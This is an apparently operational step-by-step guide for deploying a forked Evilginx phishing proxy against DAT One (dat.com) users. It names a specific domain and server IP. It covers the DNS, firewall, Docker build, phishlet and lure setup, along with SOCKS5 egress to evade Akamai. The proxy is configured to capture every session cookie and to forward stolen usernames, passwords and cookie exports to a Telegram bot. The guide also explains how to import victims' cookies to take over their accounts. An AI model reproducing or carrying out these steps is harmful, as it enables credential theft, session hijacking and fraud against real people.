# EVILGINX v5.1.0 — COMPLETE DEPLOYMENT GUIDE (Baby Steps)
## Domain: entreexampdremd.online | Server IP: 45.155.249.220

All credits:
t.me/officialmonsterz · @officialmonstersadmin · t.me/officialmonsters
github.com/officialmonsterz · bit.ly/3RXMrFa · shapads@tutamail.com

What changed in v5.1.0 (vs v5.0.0 draft):
- ✅ INCOMPLETE-COOKIES FIX: phishlets/dat_one.yaml now declares
  auth_tokens with keys '.*' and always: true on .dat.com, www.dat.com
  and one.dat.com — the engine captures EVERY cookie, including
  short-lived tokens it previously dropped on expiry checks.
- ✅ core/auto_export.go fixed: exports now default to
  ~/.evilginx/exports (INSIDE the ./data volume — files survive
  rebuilds), nil-panic on file.Stat() handled, all write errors
  checked, zero-cookie exports now warn loudly in the logs.
- ✅ Export hook verified: sendTelegramNotificationForSession exports
  the FULL in-memory cookie set before queuing the Telegram message.
- ℹ️ Telegram, lures, js_inject and SOCKS5 are NATIVE to this fork —
  configured from the console, not from extra files.
- ℹ️ telegram-watch.sh kept as a dormant fallback only (v4 sessions
  live in the database, so it can never double-send).

Follow the steps IN ORDER.

---

## STEP 1 — Namecheap DNS

1. namecheap.com → Domain List → entreexampdremd.online → Advanced DNS
2. Delete any "Parking Page" / default records
3. Add:

   | Type | Host | Value | TTL |
   |---|---|---|---|
   | A Record | @ | 45.155.249.220 | 5 min |
   | A Record | * | 45.155.249.220 | 5 min |

4. Wait ~5 min, verify on the VPS:

```bash
dig +short entreexampdremd.online            # → 45.155.249.220
dig +short random123.entreexampdremd.online   # → 45.155.249.220
```

---

## STEP 2 — Free port 53 (without breaking DNS)

```bash
sed -i 's/^#\?DNS=.*/DNS=1.1.1.1 8.8.8.8/' /etc/systemd/resolved.conf
sed -i 's/^#\?DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
systemctl restart systemd-resolved
ping -c 3 github.com        # ✅ replies
ss -lntup | grep ':53 '     # ✅ prints nothing
```

NEVER run plain `systemctl stop systemd-resolved` — it kills DNS.

---

## STEP 3 — Firewall (UFW)

```bash
ufw allow 22/tcp
ufw allow 53/udp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow from 102.88.110.77 to any port 5000 proto tcp
ufw enable
ufw status
```

Also open 53/udp, 80, 443 in the VPS provider's panel firewall if one exists.

---

## STEP 4 — Install Docker

```bash
curl -fsSL https://get.docker.com | sh
docker --version && docker compose version
```

---

## STEP 5 — Get the code

```bash
cd ~
git clone https://github.com/afrikaquality/evilginx2.git
cd evilginx2
apt install -y dnsutils
chmod +x entrypoint.sh
```

---

## STEP 6 — Sanity-check the critical files (30 seconds)

```bash
grep -n "golang" Dockerfile              # FROM golang:1.27-alpine
grep -n "go mod init" Dockerfile         # must print NOTHING
grep -n '\-p' entrypoint.sh              # evilginx -p "$APP_DIR/phishlets"
grep -n '\.evilginx' docker-compose.yml  # - ./data:/home/evilginx/.evilginx
grep -n "countSessionTokens" core/auto_export.go   # new cookie-count guard exists
grep -n "always: true" phishlets/dat_one.yaml      # the incomplete-cookies fix
```

If the last two checks print nothing → the v5.1.0 files were not pulled
(`git pull`) or the edits were not committed on GitHub yet.

---

## STEP 7 — Configure .env

```bash
nano .env
```

```env
TZ=America/New_York
TG_BOT_TOKEN=<REAL token from @BotFather>
TG_CHAT_ID=<REAL chat id>
```

- TZ must be a valid timezone (America/New_York, Africa/Lagos).
  "USA/Florida" is INVALID → silently falls back to UTC.
- Token: @BotFather → /newbot → copy token.
- Chat ID: send your bot any message → open
  https://api.telegram.org/bot<TOKEN>/getUpdates → read "chat":{"id":...}
- Test: curl -s https://api.telegram.org/bot<TOKEN>/getMe → "ok":true
- The NATIVE notifier also reads its token from the evilginx config
  (persisted in ./data) — set it in the console if the console variant
  of the command exists in your build (run `config` with no arguments
  inside the console to list all configurable keys).

docker-compose.yml (already correct in the repo):

```yaml
services:
  evilginx:
    build: .
    image: evilginx2:latest
    container_name: evilginx2
    restart: unless-stopped

    tty: true
    stdin_open: true

    network_mode: host

    environment:
      - TZ=${TZ:-UTC}
      - TG_BOT_TOKEN=${TG_BOT_TOKEN:-}
      - TG_CHAT_ID=${TG_CHAT_ID:-}

    volumes:
      # phishlet .yml files (seeded from image on first run)
      - ./phishlets:/app/phishlets
      # config, sessions database, certs, geoip AND auto-exports
      - ./data:/home/evilginx/.evilginx
```

---

## STEP 8 — Build gate (the "simulation")

```bash
docker compose build
```
Ends with `✔ Image evilginx2:latest Built`. Any Go error at this stage
means a Go file was edited wrongly on GitHub — fix it there, re-pull, rebuild.

---

## STEP 9 — Start the container

```bash
docker compose up -d
docker ps --format '{{.Names}} {{.Status}}'   # evilginx2 Up
```

Crash? → `docker logs --tail 50 evilginx2`

| Log line at crash | Fix |
|---|---|
| `path to directory...phishlets` | entrypoint lacks -p (Step 6) |
| `address already in use` | Steps 2/3 port checks |
| yml parse error | console names the file+line — fix YAML |

---

## STEP 10 — Clean junk phishlets

```bash
rm -f phishlets/1
docker compose restart
```

---

## STEP 11 — Attach to the console

```bash
docker compose attach evilginx
```
Detach, keep running: **Ctrl-p then Ctrl-q**. NEVER Ctrl-c or `exit`.

---

## STEP 12 — One-time configuration (inside console)

```
config domain entreexampdremd.online
config ipv4 external 45.155.249.220
blacklist unauth
```
Expected replies echo each value back. (The "not set" warnings on the
very FIRST boot are normal.)

---

## STEP 13 — Verify persistence

```bash
docker compose restart
sleep 5
docker compose attach evilginx     # Ctrl-p Ctrl-q back out
docker logs --tail 20 evilginx2
```
✅ No "server domain not set!" / "server external ip not set!" warnings.

---

## STEP 14 — Enable DAT One

Inside the console:

```
phishlets
phishlets hostname dat_one entreexampdremd.online
phishlets enable dat_one           # autocert for www/one/shared-content-cargo (~60s)
lhosts dat_one                     # the ONLY URLs you ever send
```

Requirements already met: DNS wildcard (Step 1) + port 80 (Step 3).
Certificates are issued/managed FULLY by evilginx (Let's Encrypt ACME).
Do NOT install certbot. Certificate Transparency visibility on crt.sh
is normal.

Self-test after enable, in a private browser:
- https://www.entreexampdremd.online/login — DAT login page, green
  padlock, Sequel Sans font renders (proves shared-content-cargo proxy).
- Complete a FULL test login → you land on
  https://one.entreexampdremd.online/dashboard — this triggers the
  auth_urls rule and stores ALL cookies.

---

## STEP 15 — SOCKS5 egress (recommended — Akamai bites datacenter IPs)

```bash
# Test the proxy first - must print the PROXY's IP, not 45.155.249.220:
curl -s --socks5-hostname user:password@us-exit-host:1080 https://api.ipify.org
```
Then set it through the console (`help` lists the exact proxy command of
your build; it persists into ./data and survives restarts). Remove with
`config proxy off` style command. Use a US exit for DAT victims.

---

## STEP 16 — Lures (per-campaign unique URLs — NATIVE)

Inside the console (`lures` alone lists every sub-command):

```
lures get dat_one
lures create dat_one
lures set path <id> /login
```
Send victims ONLY lure / lhosts URLs. Pause, redirect URL and hostname
settings all exist natively — no external tool needed.

---

## STEP 17 — Telegram notifications (verification order)

1. `curl -s https://api.telegram.org/bot<TOKEN>/getMe` → "ok":true
2. Full TEST login (Incognito) at your lure/lhosts URL
   → message with username + password arrives within ~2s
3. Silent? Check exact command name in your build:
   `grep -rn "GetTelegramBotToken" --include="*.go" ~/evilginx2 | head -5`
   → the file it appears in shows you which console command / json key
   feeds the token.
4. `docker compose config | grep TG_` → both variables must show values.

---

## STEP 18 — COOKIE COMPLETENESS CHECK (the v5.1.0 fix, how to verify)

After a full test login:

1. `docker logs --tail 30 evilginx2 | grep autoexport`
2. ✅ Healthy line: `autoexport: exported session #N (<count> cookies) to
   /home/evilginx/.evilginx/exports/...`
3. On the HOST, the file is at `~/evilginx2/data/exports/` (inside the
   ./data volume — survives rebuilds).
4. Open the JSON: the `Tokens` section must contain cookies for
   `.dat.com`, `www.dat.com` AND `one.dat.com`.
5. ❌ If you ever see `exported with ZERO cookies` → the phishlet's
   auth_tokens block is missing or malformed → re-paste Step 6's
   dat_one.yaml.
6. Compare against the real site: open dat.com, DevTools → Application
   → Cookies → count cookies for .dat.com/www.dat.com — your export
   should contain every one of them.

---

## STEP 19 — Using captured sessions

1. Console: `sessions` → list; `sessions <id>` → username, password,
   full cookie set.
2. Import cookie file: open https://one.dat.com in a fresh browser
   profile → Cookie-Editor extension → Import (JSON) → paste the
   Tokens content (Name/Value pairs per domain) → reload.
3. The exported JSON also arrives via Telegram when the queue attaches
   session files.

---

## STEP 20 — js_inject (optional advanced — NATIVE format of this fork)

Add to phishlets/dat_one.yaml (list form):

```yaml
js_inject:
  - trigger_domains: ['www.dat.com']
    trigger_paths:
      - '/login.*'
    js: |
      (function () {
        console.log('DAT One page inside proxy loaded');
      })();
```

Runs on every matching HTML page served through the proxy.

---

## STEP 21 — Daily operations cheat-sheet

```bash
cd ~/evilginx2
docker compose attach evilginx         # live console (Ctrl-p Ctrl-q)
docker logs -f evilginx2              # background logs
docker compose restart
git pull && docker compose build && docker compose up -d    # update
ls -lt data/exports/                 # newest captured sessions
```

## STEP 22 — Everything that can break + the fix

| Symptom | Fix |
|---|---|
| Build: go.mod version error | Dockerfile not golang:1.27 (Step 6) |
| Could not resolve host: github.com | systemctl start systemd-resolved, redo Step 2 |
| Restarting / can't attach | docker logs evilginx2 → Step 9 table |
| domain/IP forgotten after rebuild | ./data volume missing (Step 6) |
| cert issuance fails | DNS wildcard (Step 1) or port 80 (Step 3) |
| Port 53 bind error | Step 2 |
| Dashboard unreachable | UFW 5000 rule (Step 3) |
| Captcha / silent login rejects | rotate/fix SOCKS5 exit (Step 15) |
| Phish page blank | only send lhosts/lure URLs |
| Log timestamps wrong | TZ= valid name (Step 7) |
| Telegram silent | Step 17 order |
| **Exports incomplete / cookies missing** | **Step 18 — re-check auth_tokens in dat_one.yaml (keys '.*' + always: true), then re-enable the phishlet** |
| Export files vanished after rebuild | old temp-dir default — pull v5.1.0 auto_export.go (Step 6) |
| `autoexport` lines never in logs | hook missing — re-paste sendTelegramNotificationForSession from the v5.1.0 notes |
| GeoIP warning in logs | Cosmetic only (ignorable) |

## STEP 23 — What lives where (persistence map)

| Host path (~/evilginx2/) | What it holds |
|---|---|
| phishlets/ | your .yml phishlets incl. dat_one (survives everything) |
| data/ | config, sessions database, Let's Encrypt certs (survives everything) |
| data/exports/ | auto-exported session cookie files (v5.1.0 default) |
| .env | timezone + telegram creds |
